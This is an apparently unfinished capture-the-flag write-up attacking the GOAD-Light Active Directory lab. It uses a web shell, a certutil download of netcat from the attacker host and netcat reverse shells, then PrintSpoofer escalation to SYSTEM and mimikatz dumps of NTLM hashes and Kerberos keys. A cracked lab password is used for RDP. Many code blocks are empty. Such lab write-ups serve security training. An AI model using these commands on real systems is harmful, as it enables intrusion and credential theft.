---
title: GOAD-Light
parent: GOAD
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
```zsh
┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
└─$ sudo arp-scan --interface=eth2 --localnet
Interface: eth2, type: EN10MB, MAC: 00:0c:29:6b:86:11, IPv4: 192.168.56.99
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:13       (Unknown: locally administered)
192.168.56.3    08:00:27:61:12:2c       PCS Systemtechnik GmbH
192.168.56.10   08:00:27:06:b1:4b       PCS Systemtechnik GmbH
192.168.56.11   08:00:27:49:ff:ac       PCS Systemtechnik GmbH
192.168.56.22   08:00:27:96:75:30       PCS Systemtechnik GmbH
192.168.56.200  08:00:27:37:70:27       PCS Systemtechnik GmbH
192.168.56.202  08:00:27:0a:c1:0b       PCS Systemtechnik GmbH
192.168.56.206  08:00:27:68:a7:62       PCS Systemtechnik GmbH

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.951 seconds (131.21 hosts/sec). 8 responded
```
# srv02
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
└─$ sudo nmap -Pn -p- -sSCV -A -oN srv22_full-tcp-scan.txt --open 192.168.56.22 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 06:25 +0900
Nmap scan report for 192.168.56.22
Host is up (0.00044s latency).
Not shown: 59762 closed tcp ports (reset), 5756 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-08T14:26:54+00:00; -7h00m00s from scanner time.
| ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local
| Not valid before: 2026-05-27T19:59:07
|_Not valid after:  2026-11-26T19:59:07
| rdp-ntlm-info: 
|   Target_Name: NORTH
|   NetBIOS_Domain_Name: NORTH
|   NetBIOS_Computer_Name: CASTELBLACK
|   DNS_Domain_Name: north.sevenkingdoms.local
|   DNS_Computer_Name: castelblack.north.sevenkingdoms.local
|   DNS_Tree_Name: sevenkingdoms.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-08T14:26:48+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/wsmans?
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-06-08T14:26:54+00:00; -7h00m00s from scanner time.
| ssl-cert: Subject: commonName=VAGRANT
| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant
| Not valid before: 2026-05-27T12:08:15
|_Not valid after:  2029-05-26T12:08:15
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:96:75:30 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:96:75:30 (Oracle VirtualBox virtual NIC)
|_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m00s
| smb2-time: 
|   date: 2026-06-08T14:26:48
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms 192.168.56.22

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.83 seconds

```

http://192.168.56.22/

![](../../../assets/images/Pasted%20image%2020260608233606.png)

http://192.168.56.22/Default.aspx

![](../../../assets/images/Pasted%20image%2020260608233620.png)

![](../../../assets/images/Pasted%20image%2020260608233730.png)

```zsh
┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
└─$ feroxbuster \
-u http://192.168.56.22 \
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old,aspx \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
```

http://192.168.56.22/upload/cmdasp.aspx

![](../../../assets/images/Pasted%20image%2020260608234205.png)

```zsh
certutil -urlcache -f http://192.168.56.99/nc.exe C:\tmp\nc.exe
```

![](../../../assets/images/Pasted%20image%2020260608234619.png)

```zsh
C:\tmp\nc.exe 192.168.56.99 4444 -e cmd
```

---

# Initial Access


![](../../../assets/images/Pasted%20image%2020260608234743.png)

```zsh
┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
└─$ rlwrap -cAr nc -lvnp 4444                                            
listening on [any] 4444 ...
connect to [192.168.56.99] from (UNKNOWN) [192.168.56.22] 49985
Microsoft Windows [Version 10.0.17763.8755]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

```zsh
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

---
# Privilege Escalation


```zsh
c:\windows\system32\inetsrv>C:\tmp\PrintSpoofer64.exe  -c "C:\tmp\nc.exe 192.168.56.99 5555 -e cmd"
C:\tmp\PrintSpoofer64.exe  -c "C:\tmp\nc.exe 192.168.56.99 5555 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

```zsh
┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
└─$ rlwrap -cAr nc -lvnp 5555                            
listening on [any] 5555 ...
connect to [192.168.56.99] from (UNKNOWN) [192.168.56.22] 50003
Microsoft Windows [Version 10.0.17763.8755]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

C:\Windows\system32>whoami 
whoami 
nt authority\system
```

```zsh
Authentication Id : 0 ; 427178 (00000000:000684aa)
Session           : RemoteInteractive from 2
User Name         : robb.stark
Domain            : NORTH
Logon Server      : WINTERFELL
Logon Time        : 6/8/2026 7:16:15 AM
SID               : S-1-5-21-1137986105-3210816010-4073059486-1113
        msv :
         [00000003] Primary
         * Username : robb.stark
         * Domain   : NORTH
         * NTLM     : 831486ac7f26860c9e2f51ac91e1a07a
         * SHA1     : 3bea28f1c440eed7be7d423cefebb50322ed7b6c
         * DPAPI    : 85f9762541f4073e9625b1fdedde9a03
        tspkg :
        wdigest :
         * Username : robb.stark
         * Domain   : NORTH
         * Password : (null)
        kerberos :
         * Username : robb.stark
         * Domain   : NORTH.SEVENKINGDOMS.LOCAL
         * Password : (null)

```

831486ac7f26860c9e2f51ac91e1a07a
sexywolfy
![](../../../assets/images/Pasted%20image%2020260609002155.png)

```powershell
c:\windows\system32\inetsrv>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : castelblack
   Primary Dns Suffix  . . . . . . . : north.sevenkingdoms.local
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : north.sevenkingdoms.local
                                       sevenkingdoms.local

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter #2
   Physical Address. . . . . . . . . : 08-00-27-96-75-30
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::b28f:4b76:b07c:851c%6(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.56.22(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   DHCPv6 IAID . . . . . . . . . . . : 117964839
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-AA-4A-AB-08-00-27-7A-A2-FC
   DNS Servers . . . . . . . . . . . : 192.168.56.11
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Desktop Adapter
   Physical Address. . . . . . . . . : 08-00-27-7A-A2-FC
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : fd17:625c:f037:2:238d:4568:8e5:4f3(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::dbe0:36a7:8e1a:73f2%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.0.2.15(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Friday, May 2, 1890 7:42:20 AM
   Lease Expires . . . . . . . . . . : Tuesday, June 9, 2026 7:10:54 AM
   Default Gateway . . . . . . . . . : fe80::2%4
                                       10.0.2.2
   DHCP Server . . . . . . . . . . . : 10.0.2.2
   DHCPv6 IAID . . . . . . . . . . . : 101187623
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-AA-4A-AB-08-00-27-7A-A2-FC
   DNS Servers . . . . . . . . . . . : 192.168.11.1
   NetBIOS over Tcpip. . . . . . . . : Enabled

```

```zsh
┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
└─$ xfreerdp3 /u:robb.stark /d:north.sevenkingdoms.local /p:sexywolfy /v:192.168.56.22 /dynamic-resolution
```

```zsh
C:\tmp\mimikatz.exe 

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::sam
Domain : CASTELBLACK
SysKey : badf43f793f32b1cc92b8ecfb777448e
Local SID : S-1-5-21-104956584-559109605-908332111

SAMKey : 54397f1f5be1f19c64e2ce9b20c0a7d4

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: dbd13e1c4e338284ac4e9874f7de6ef4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 95572bc67af4f876ea82515ef0e380a0

* Primary:Kerberos-Newer-Keys *
    Default Salt : VAGRANTAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e7aa0f8a649aa96fab5ed9e65438392bfc549cb2695ac4237e97996823619972
      aes128_hmac       (4096) : bb7b6aed58a7a395e0e674ac76c28aa0
      des_cbc_md5       (4096) : fe58cdcd13a43243
    OldCredentials
      aes256_hmac       (4096) : 05ebd58ad12ff00465687ed1e33e4631c4739859f369ae36a7f6fccbe795fb78
      aes128_hmac       (4096) : 778a45f4f133513b831ce562570ac6af
      des_cbc_md5       (4096) : 58bf1ff4c4f4b0f2
    OlderCredentials
      aes256_hmac       (4096) : aa3c962519c1e2dee9ffb53df04325424f812bba47279767ad25eaccffd18695
      aes128_hmac       (4096) : 2f72e6aa959c5ea08e11deabfce6ed55
      des_cbc_md5       (4096) : 62bf012513ea8c0e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : VAGRANTAdministrator
    Credentials
      des_cbc_md5       : fe58cdcd13a43243
    OldCredentials
      des_cbc_md5       : 58bf1ff4c4f4b0f2


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4363b6dc0c95588964884d7e1dfea1f7

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 03a659ee63caba3a4abb578087d86a35

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e2d64d3002108324d20638239c935473767a9d7ed14d3fbfdfb9dca09b0ca43c
      aes128_hmac       (4096) : 81a21c239b02db38b36589af9ca027a5
      des_cbc_md5       (4096) : d33ba768d95dc257

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : d33ba768d95dc257


RID  : 000003e8 (1000)
User : vagrant
  Hash NTLM: e02bc503339d51f71d913c245d35b50b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 503d6e8e5de1854c6257b711e268fe30

* Primary:Kerberos-Newer-Keys *
    Default Salt : VAGRANT-2019vagrant
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : aa97635c942315178db04791ffa240411c36963b5a5e775e785c6bd21dd11c24
      aes128_hmac       (4096) : 0d7c6160ffb016857b9af96c44110ab1
      des_cbc_md5       (4096) : 16dc9e8ad3dfc47f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : VAGRANT-2019vagrant
    Credentials
      des_cbc_md5       : 16dc9e8ad3dfc47f


mimikatz # 

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
# DC01

```zsh
┌──(kali㉿kali)-[~/CTF/GOAD/GOAD-Light]
└─$ sudo nmap -Pn -p- -sSCV -A -oN dc01_full-tcp-scan.txt --open 192.168.56.10
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-09 06:28 +0900
Nmap scan report for 192.168.56.10
Host is up (0.00053s latency).
Not shown: 59946 closed tcp ports (reset), 5561 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-08 14:29:03Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
| Not valid before: 2026-05-28T20:01:29
|_Not valid after:  2027-05-28T20:01:29
|_ssl-date: 2026-06-08T14:30:07+00:00; -7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
| Not valid before: 2026-05-28T20:01:29
|_Not valid after:  2027-05-28T20:01:29
|_ssl-date: 2026-06-08T14:30:07+00:00; -7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-06-08T14:30:07+00:00; -7h00m00s from scanner time.
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
| Not valid before: 2026-05-28T20:01:29
|_Not valid after:  2027-05-28T20:01:29
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
| Not valid before: 2026-05-28T20:01:29
|_Not valid after:  2027-05-28T20:01:29
|_ssl-date: 2026-06-08T14:30:07+00:00; -7h00m00s from scanner time.
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Not valid before: 2026-05-27T19:19:36
|_Not valid after:  2026-11-26T19:19:36
| rdp-ntlm-info: 
|   Target_Name: SEVENKINGDOMS
|   NetBIOS_Domain_Name: SEVENKINGDOMS
|   NetBIOS_Computer_Name: KINGSLANDING
|   DNS_Domain_Name: sevenkingdoms.local
|   DNS_Computer_Name: kingslanding.sevenkingdoms.local
|   DNS_Tree_Name: sevenkingdoms.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-08T14:29:59+00:00
|_ssl-date: 2026-06-08T14:30:07+00:00; -7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/wsmans?
| ssl-cert: Subject: commonName=VAGRANT
| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant
| Not valid before: 2026-05-27T11:57:27
|_Not valid after:  2029-05-26T11:57:27
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-06-08T14:30:07+00:00; -7h00m00s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
49792/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:06:B1:4B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop
Service Info: Host: KINGSLANDING; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-08T14:29:59
|_  start_date: N/A
|_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m00s
|_nbstat: NetBIOS name: KINGSLANDING, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:06:b1:4b (Oracle VirtualBox virtual NIC)

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms 192.168.56.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.86 seconds

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>